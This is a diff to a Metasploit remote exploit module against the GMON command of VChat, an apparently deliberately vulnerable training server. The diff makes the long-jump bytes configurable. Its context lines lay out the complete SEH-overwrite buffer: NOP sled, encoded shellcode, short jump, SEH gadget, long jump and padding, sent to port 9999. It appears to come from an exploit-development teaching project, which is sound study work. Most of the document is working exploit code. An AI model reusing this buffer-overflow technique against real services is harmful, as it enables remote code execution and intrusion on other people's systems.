@@ -25,7 +25,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
         'References'     =>	# References for the vulnerability or exploit
           [
             #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
-            [ 'URL', 'https://github.com/DaintyJet/VChat_GTER_EggHunter' ]
+            [ 'URL', 'https://github.com/DaintyJet/VChat_GMON_SEH' ]
   
           ],
         'Privileged'     => false,
@@ -52,6 +52,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
         register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
             [
             OptInt.new('RETOFFSET_GMON', [true, 'Offset of SEH Handler in the function GMON', 3571]),
+            OptString.new('LONG_JUMP', [true, 'Long Jump Instruction, Provided in HEX Digits', "\xe9\x46\xf2\xff\xff"]),
             Opt::RPORT(9999),
             Opt::RHOSTS('192.168.7.191')
         ])
@@ -62,7 +63,8 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       connect	# Connect to the target
       
       shellcode = payload.encode()
-      long_jump = "\xe9\x46\xf2\xff\xff"
+      long_jump = datastore['LONG_JUMP'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
+
 
       outbound_GTER = 'GMON /.:/' + "\x90"*100 + shellcode + "\x90"*(datastore['RETOFFSET_GMON'] - 100 - 4 - shellcode.length()) + "\xeb\x08" + "\x90\x90" + [target['seh-gadget']].pack('V') + "\x90\x90" + long_jump + "F"*1500 # Create the malicious string that will be sent to the target
   
